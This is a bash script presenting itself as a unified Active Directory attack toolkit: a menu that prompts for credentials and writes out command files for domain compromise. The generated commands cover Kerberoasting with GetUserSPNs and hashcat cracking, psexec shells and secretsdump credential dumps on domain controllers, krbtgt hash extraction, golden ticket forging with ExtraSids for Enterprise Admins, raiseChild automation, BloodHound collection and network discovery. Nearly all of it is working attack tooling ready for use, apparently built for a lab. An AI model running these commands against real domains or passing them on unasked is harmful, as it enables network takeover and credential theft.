#!/bin/bash
# ad-attack-toolkit.sh - Unified AD Attack Toolkit Launcher (Linux)

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

show_banner() {
    clear
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║                  AD ATTACK TOOLKIT - UNIFIED EDITION                      ║
║                    Linux & Windows Attack Platform                        ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF
}

show_menu() {
    echo -e "\n${CYAN}═══ SELECT ATTACK TYPE ══════════════════════════════════════════${NC}"
    echo -e "${YELLOW}[1]${NC} Cross-Forest Trust Attack (Linux → External Forest)"
    echo -e "${YELLOW}[2]${NC} Child-Parent Trust Attack  (Windows/Linux → Parent Domain)"
    echo -e "${YELLOW}[3]${NC} Discovery Phase (Enumerate all domains)"
    echo -e "${YELLOW}[4]${NC} Combined Attack (Both methods)"
    echo -e "${YELLOW}[Q]${NC} Quit"
    echo -e "${CYAN}═════════════════════════════════════════════════════════════════${NC}\n"
}

# Cross-Forest Attack (Linux)
cross_forest_attack() {
    echo -e "\n${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║         CROSS-FOREST TRUST ATTACK (Linux)                      ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
    
    # Check dependencies
    echo -e "${CYAN}[*] Checking dependencies...${NC}"
    local missing_deps=()
    
    command -v GetUserSPNs.py >/dev/null 2>&1 || missing_deps+=("impacket-GetUserSPNs")
    command -v bloodhound-python >/dev/null 2>&1 || missing_deps+=("bloodhound-python")
    command -v hashcat >/dev/null 2>&1 || missing_deps+=("hashcat")
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        echo -e "${RED}[!] Missing dependencies: ${missing_deps[*]}${NC}"
        echo -e "${YELLOW}[!] Install with: pip3 install impacket bloodhound${NC}"
        return 1
    fi
    
    echo -e "${GREEN}[+] All dependencies found${NC}\n"
    
    # Get credentials
    echo -e "${YELLOW}[?] Enter source domain credentials:${NC}"
    read -p "Username: " SOURCE_USER
    read -sp "Password: " SOURCE_PASS
    echo ""
    read -p "Source Domain: " SOURCE_DOMAIN
    read -p "Source DC IP: " SOURCE_DC_IP
    
    echo -e "\n${YELLOW}[?] Enter target domain information:${NC}"
    read -p "Target Domain: " TARGET_DOMAIN
    read -p "Target DC IP: " TARGET_DC_IP
    read -p "Target DC Hostname: " TARGET_DC_NAME
    
    # Generate commands
    local OUTPUT_DIR="cross-forest_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"
    local CMD_FILE="$OUTPUT_DIR/commands.sh"
    
    cat > "$CMD_FILE" << EOF
#!/bin/bash
# Cross-Forest Trust Attack Commands
# Generated: $(date)

# ════════════════════════════════════════════════════════════════════════
# PHASE 1: KERBEROASTING
# ════════════════════════════════════════════════════════════════════════

# Step 1: Enumerate SPNs in target forest
GetUserSPNs.py -target-domain $TARGET_DOMAIN $SOURCE_DOMAIN/$SOURCE_USER

# Step 2: Request TGS tickets
GetUserSPNs.py -request -target-domain $TARGET_DOMAIN $SOURCE_DOMAIN/$SOURCE_USER

# Step 3: Save to file
GetUserSPNs.py -request -outputfile ${TARGET_DOMAIN}_tgs.txt -target-domain $TARGET_DOMAIN $SOURCE_DOMAIN/$SOURCE_USER

# Step 4: Crack with Hashcat
hashcat -m 13100 ${TARGET_DOMAIN}_tgs.txt /usr/share/wordlists/rockyou.txt

# Step 5: Show cracked
hashcat -m 13100 ${TARGET_DOMAIN}_tgs.txt --show

# ════════════════════════════════════════════════════════════════════════
# PHASE 2: EXPLOITATION (Replace <USER>:<PASS> with cracked creds)
# ════════════════════════════════════════════════════════════════════════

# Get shell
psexec.py $TARGET_DOMAIN/<USER>:'<PASS>'@$TARGET_DC_NAME

# Dump credentials
secretsdump.py '$TARGET_DOMAIN/<USER>:<PASS>@$TARGET_DC_IP'

# ════════════════════════════════════════════════════════════════════════
# PHASE 3: BLOODHOUND
# ════════════════════════════════════════════════════════════════════════

# Configure DNS
echo -e "domain $TARGET_DOMAIN\\nnameserver $TARGET_DC_IP" | sudo tee /etc/resolv.conf

# Collect
bloodhound-python -d $TARGET_DOMAIN -dc $TARGET_DC_NAME -c All -u $SOURCE_USER@$(echo $SOURCE_DOMAIN | tr '[:upper:]' '[:lower:]') -p '$SOURCE_PASS'

# Compress
zip -r bloodhound_$(date +%Y%m%d_%H%M%S).zip *.json
EOF
    
    chmod +x "$CMD_FILE"
    
    echo -e "\n${GREEN}[+] Commands generated: ${YELLOW}$CMD_FILE${NC}"
    echo -e "${CYAN}[*] Review and execute the commands manually${NC}\n"
}

# Child-Parent Attack (for Linux with Impacket)
child_parent_attack() {
    echo -e "\n${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║       CHILD-PARENT TRUST ATTACK (Linux/Impacket)             ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
    
    # Get credentials
    echo -e "${YELLOW}[?] Enter child domain admin credentials:${NC}"
    read -p "Username: " CHILD_USER
    read -sp "Password: " CHILD_PASS
    echo ""
    read -p "Child Domain: " CHILD_DOMAIN
    read -p "Child DC IP: " CHILD_DC_IP
    
    echo -e "\n${YELLOW}[?] Enter parent domain information:${NC}"
    read -p "Parent Domain: " PARENT_DOMAIN
    read -p "Parent DC IP: " PARENT_DC_IP
    read -p "Parent DC Hostname: " PARENT_DC_NAME
    
    # Generate commands
    local OUTPUT_DIR="child-parent_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"
    local CMD_FILE="$OUTPUT_DIR/commands.sh"
    
    CHILD_SHORT=$(echo "$CHILD_DOMAIN" | cut -d'.' -f1 | tr '[:lower:]' '[:upper:]')
    
    cat > "$CMD_FILE" << EOF
#!/bin/bash
# Child-Parent Trust Attack Commands (ExtraSids)
# Generated: $(date)

# ════════════════════════════════════════════════════════════════════════
# STEP 1: Extract KRBTGT Hash from Child Domain
# ════════════════════════════════════════════════════════════════════════
secretsdump.py '$CHILD_DOMAIN/$CHILD_USER:$CHILD_PASS@$CHILD_DC_IP' -just-dc-user $CHILD_SHORT/krbtgt

# Save the KRBTGT NTLM hash: _________________


# ════════════════════════════════════════════════════════════════════════
# STEP 2: Get Child Domain SID
# ════════════════════════════════════════════════════════════════════════
lookupsid.py '$CHILD_DOMAIN/$CHILD_USER:$CHILD_PASS@$CHILD_DC_IP' | grep "Domain SID"

# Save the Child SID: _________________


# ════════════════════════════════════════════════════════════════════════
# STEP 3: Get Parent Domain SID (for Enterprise Admins)
# ════════════════════════════════════════════════════════════════════════
lookupsid.py '$CHILD_DOMAIN/$CHILD_USER:$CHILD_PASS@$PARENT_DC_IP' | grep "Domain SID"

# Save the Parent SID: _________________
# REMEMBER: Append -519 for Enterprise Admins!


# ════════════════════════════════════════════════════════════════════════
# STEP 4: Forge Golden Ticket with ExtraSids
# ════════════════════════════════════════════════════════════════════════
# Replace placeholders with actual values from above:

ticketer.py -nthash <KRBTGT_HASH> \\
            -domain $(echo $CHILD_DOMAIN | tr '[:lower:]' '[:upper:]') \\
            -domain-sid <CHILD_SID> \\
            -extra-sid <PARENT_SID>-519 \\
            hacker

# This creates: hacker.ccache


# ════════════════════════════════════════════════════════════════════════
# STEP 5: Use the Golden Ticket
# ════════════════════════════════════════════════════════════════════════
export KRB5CCNAME=\$(pwd)/hacker.ccache

# Verify
klist

# Get shell on parent DC
psexec.py hacker@$PARENT_DC_NAME -k -no-pass -target-ip $PARENT_DC_IP

# Alternative: Dump credentials
secretsdump.py hacker@$PARENT_DC_NAME -k -no-pass -target-ip $PARENT_DC_IP

# ════════════════════════════════════════════════════════════════════════
# AUTOMATED METHOD
# ════════════════════════════════════════════════════════════════════════
raiseChild.py -target-exec $PARENT_DC_IP '$(echo $CHILD_DOMAIN | tr '[:lower:]' '[:upper:]')/$CHILD_USER:$CHILD_PASS'
EOF
    
    chmod +x "$CMD_FILE"
    
    echo -e "\n${GREEN}[+] Commands generated: ${YELLOW}$CMD_FILE${NC}"
    echo -e "${YELLOW}[!] CRITICAL: The -extra-sid parameter MUST end with -519${NC}"
    echo -e "${CYAN}[*] Review and execute commands step-by-step${NC}\n"
}

# Discovery Phase
discovery_phase() {
    echo -e "\n${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║              DISCOVERY PHASE                                   ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
    
    # Run Phase 1 discovery if available
    if [ -f "phase1-discovery.sh" ]; then
        echo -e "${CYAN}[*] Running Phase 1 discovery...${NC}"
        ./phase1-discovery.sh
    else
        echo -e "${YELLOW}[!] Phase 1 discovery script not found${NC}"
        echo -e "${CYAN}[*] Manual discovery commands:${NC}\n"
        
        cat << 'EOF'
# Scan for Domain Controllers
sudo nmap -p 88,389,445 --open 172.16.5.0/24 -oG - | grep "/open"

# LDAP enumeration
ldapsearch -x -H ldap://DC_IP -b "" -s base defaultNamingContext

# SMB enumeration
crackmapexec smb DC_IP
EOF
    fi
}

# Combined Attack
combined_attack() {
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║           COMBINED ATTACK (All Methods)                        ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${CYAN}[*] This will generate commands for both attack types${NC}\n"
    
    discovery_phase
    echo ""
    cross_forest_attack
    echo ""
    child_parent_attack
    
    echo -e "\n${GREEN}[+] All attack commands generated!${NC}"
    echo -e "${CYAN}[*] Check the output directories for generated scripts${NC}\n"
}

# Main loop
main() {
    show_banner
    
    while true; do
        show_menu
        read -p "Choice: " choice
        
        case $choice in
            1)
                cross_forest_attack
                ;;
            2)
                child_parent_attack
                ;;
            3)
                discovery_phase
                ;;
            4)
                combined_attack
                ;;
            Q|q)
                echo -e "\n${GREEN}[+] Exiting. Happy hunting!${NC}\n"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid choice${NC}"
                ;;
        esac
        
        echo -e "\n${YELLOW}Press Enter to return to menu...${NC}"
        read
    done
}

# Run
main
